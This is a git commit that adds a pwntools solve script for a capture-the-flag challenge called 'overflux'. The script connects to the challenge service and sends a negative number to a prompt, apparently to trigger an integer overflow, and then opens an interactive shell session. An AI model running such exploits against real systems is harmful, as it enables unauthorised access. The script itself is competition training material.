c678c4426c8b7528d82f093e3206a72e5d8759ea
Myagmartseren <myagmartseren7@gmail.com>
2023-11-16 23:42:59 +0800

    pwn/overflux

---
+++ round1/pwn/overflux/challenge/solve/solve.py
@@ -0,0 +1,32 @@
+#!/usr/bin/env python3
+from pwn import *
+
+exe = context.binary = ELF(args.EXE or '../src/overflux')
+
+host = args.HOST or '127.0.0.1'
+port = int(args.PORT or 8889)
+
+def start_local(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io)
+    return io
+
+def start(argv=[], *a, **kw):
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+io = start()
+io.clean()
+io.sendlineafter(b"(0 to finish):",b"-65530")
+io.sendlineafter(b"(0 to finish):",b"0")
+
+io.interactive()
